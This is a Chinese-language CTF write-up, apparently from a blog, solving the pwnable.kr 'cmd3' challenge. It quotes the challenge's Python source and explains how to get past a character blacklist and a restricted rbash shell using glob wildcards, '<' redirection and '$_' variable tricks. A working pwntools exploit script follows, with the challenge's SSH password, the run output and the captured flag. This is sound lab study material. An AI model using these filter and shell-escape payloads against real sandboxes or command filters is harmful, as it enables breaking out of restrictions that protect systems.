---
title: pwnable.kr-cmd3
date: 2018-07-11 12:18:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
这是`cmd2`的升级版，题目做了很多限制，我也是花了好长时间才想出来。
# 分析
题目给出了`cmd3.py`的源码
```python
#!/usr/bin/python
import base64, random, math
import os, sys, time, string
from threading import Timer

def rstring(N):
	return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

password = rstring(32)
filename = rstring(32)

TIME = 60
class MyTimer():
	global filename
        timer=None
        def __init__(self):
                self.timer = Timer(TIME, self.dispatch, args=[])
                self.timer.start()
        def dispatch(self):
                print 'time expired! bye!'
		sys.stdout.flush()
		os.system('rm flagbox/'+filename)
                os._exit(0)

def filter(cmd):
	blacklist = '` !&|"\'*'
	for c in cmd:
		if ord(c)>0x7f or ord(c)<0x20: return False
		if c.isalnum(): return False
		if c in blacklist: return False
	return True

if __name__ == '__main__':
	MyTimer()
	print 'your password is in flagbox/{0}'.format(filename)
	os.system("ls -al")
	os.system("ls -al jail")
	open('flagbox/'+filename, 'w').write(password)
	try:
		while True:
			sys.stdout.write('cmd3$ ')
			sys.stdout.flush()
			cmd = raw_input()
			if cmd==password:
				os.system('./flagbox/print_flag')
				raise 1
			if filter(cmd) is False:
				print 'caught by filter!'
				sys.stdout.flush()
				raise 1

			os.system('echo "{0}" | base64 -d - | env -i PATH=jail /bin/rbash'.format(cmd.encode('base64')))
			sys.stdout.flush()
	except:
		os.system('rm flagbox/'+filename)
		os._exit(0)
```
从源码中可以看出一下限制：
 - 程序使用了一个过滤函数`filter`。该函数不允许输入中带有`0-9a-zA-Z`和`` !&|"\'*`的字符，并且输入必须在可打印字符的范围内。
 - 通过过滤函数的检查后，输入会被`base64`编码再传入`os.system`函数执行命令。所以这里也无法命令注入。
 - 程序使用`env`命令重写了`PATH`变量开启了新的命令执行环境，并且使用`/bin/rbash`（受限制shell）来执行输入的命令。
题目需要绕过这些限制并读取到`password`然后提交即可getfalg。
先执行一下程序（注意先阅读readme）
```
cmd3@ubuntu:~$ nc 0 9023
total 5268
drwxr-x---  5 root cmd3_pwn    4096 Mar 15  2016 .
drwxr-xr-x 87 root root        4096 Dec 27  2017 ..
d---------  2 root root        4096 Jan 22  2016 .bash_history
-rwxr-x---  1 root cmd3_pwn    1421 Mar 11  2016 cmd3.py
drwx-wx---  2 root cmd3_pwn   24576 Jul 10 20:07 flagbox
drwxr-x---  2 root cmd3_pwn    4096 Jan 22  2016 jail
-rw-r--r--  1 root root     5345137 Jul 10 20:09 log
-rw-r-----  1 root root         764 Mar 10  2016 super.pl
total 8
drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .
drwxr-x--- 5 root cmd3_pwn 4096 Mar 15  2016 ..
lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -> /bin/cat
lrwxrwxrwx 1 root root       11 Jan 22  2016 id -> /usr/bin/id
lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -> /bin/ls
your password is in flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L
cmd3$
```
可以看到我们只能执行`jail`目录下的三个程序，其他程序由于需要跨目录执行，必须使用`/`符号，然而在`/bin/rbash`中是不允许命令中带有`/`符号的（关于受限制shell可以参考[rbash - 一个受限的Bash Shell用实际示例说明](https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/)）。对于该题目来说只需要执行`cat flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L`获得password即可。但是要执行该命令需要考虑绕过空格和字母数字，因为这些字符无法通过`filter`函数。接下来只要绕过这些即可。
1. 绕过空格。对于`cat`命令，可以使用`<`符号来代替空格。也可使用其他方法，参考[linux下不用空格执行带参数的5种姿势](https://www.cnblogs.com/sevck/p/6072721.html)。
2. 绕过字符数字。要想绕过最常用最重要的字母数字，必须借用已经有的字母数字。在linux下有很多通配符可以用来指代某些文件，`*`符号被过滤了可以使用`?`（表示该位置必有一个字符）来指代。例如，要指代`jail/cat`可以输入`????/???`即可。当然，如果出现了指代多个文件或目录的情况它一般指代`ls`命令排序后的第一个。但是，对于受限制shell来说使用上面指代的话还是会出现`/`符号导致无法执行，我们必须执行`cat`而不是用路径指代它。这时，需要了解`$_`变量，该变量在shell中指代上次执行的命令，这样我们可以先使用上面的方式执行一遍，然后操作`$_`变量获取它的子串`cat`即可。可以输入`????/???;${__=${_#?????}};`来将`cat`保存在`$___`变量中。对于linux下的环境变量的操作可以参考[https://blog.csdn.net/number_0_0/article/details/73291182](https://blog.csdn.net/number_0_0/article/details/73291182)。要解决`flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L`这样的长字符串，可以利用`cat`命令来从`/tmp/`（任何用户可读写）目录下的文件读取。例如，将长字符串写入`/tmp/__/1`中，然后执行`$(cat</???/__/?)`这样`$_`变量就存有长字符串了。
下面是exp
```python
from pwn import *

s = ssh(port=2222,user="cmd3",host="pwnable.kr",password="FuN_w1th_5h3ll_v4riabl3s_haha")
poc = "????/???;${__=${_#?????}};$($__</???/__/?);${___=$_};$__<$___"

r = s.run("nc 0 9023")
r.recvuntil("your password is in ")
data = r.recvline().rstrip() #get flagbox/......
s.run("mkdir /tmp/__")
s.run('echo "{0}" >/tmp/__/1'.format(data))
r.recvuntil("cmd3$ ")
r.sendline(poc)
tmp = r.recvuntil("cmd3$ ")
pwd = tmp[-38:-6]
print 'Get pwd: {0}'.format(pwd)
r.sendline(pwd)
print r.recvall()

```
```
root@kali:~/Desktop# python poc.py
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Opening new channel: 'nc 0 9023': Done
[+] Opening new channel: 'mkdir /tmp/__': Done
[+] Opening new channel: 'echo "flagbox/9E36W2ZIM8Y0I4GWLPMKPE1GAQPGCMFO" >/tmp/__/1': Done
Get pwd: 5AE535O9P84VCXKWS1PYYRRT8JLD3JQN
[+] Receiving all data: Done (54B)
[*] Closed SSH channel with pwnable.kr
Congratz! here is flag : D4ddy_c4n_n3v3r_St0p_m3_haha

[*] Closed SSH channel with pwnable.kr
[*] Closed SSH channel with pwnable.kr

```
# 总结
这道题目很有意思，主要使用linux下shell的知识，又学到了不少。